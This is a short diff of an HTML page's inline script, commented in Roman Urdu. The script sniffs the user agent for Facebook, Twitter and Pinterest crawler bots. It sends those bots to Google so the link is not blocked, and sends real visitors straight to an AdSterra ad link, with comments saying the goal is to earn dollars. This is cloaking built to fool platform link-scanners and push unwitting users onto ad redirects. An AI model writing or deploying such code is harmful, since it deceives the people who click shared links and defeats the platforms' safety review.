@@ -7,17 +7,17 @@
 <body>
 
     <script>
-        // 🎯 Aap ka AdSterra ka lamba link yahan tijori mein chupa diya hai
+        // 🎯 Aap ka AdSterra ka Direct Link
         const myDirectLink = "https://www.effectivecpmnetwork.com/pduxakd8bz?key=7b620d9ea9bca1edde74b93c2610072b";
 
-        // Facebook ke bot ko pehchanna
+        // Meta aur baqi social media ke bots ki pehchan
         const isBot = /facebookexternalhit|Facebot|Twitterbot|Pinterestbot/i.test(navigator.userAgent);
 
         if (isBot) {
-            // Facebook ka bot aaye to use sirf blank page dikhega
-            document.body.innerHTML = "<h3>Content Not Available</h3>";
+            // 🤖 Bot aaye to use direct Google par bhej do (Taake link block na ho)
+            window.location.href = "https://www.google.com";
         } else {
-            // Asli user click kare to woh furan aap ke ad link par chala jayega
+            // 👤 Asli user aaye to furan AdSterra par bhej kar dollar banao
             window.location.href = myDirectLink;
         }
     </script>
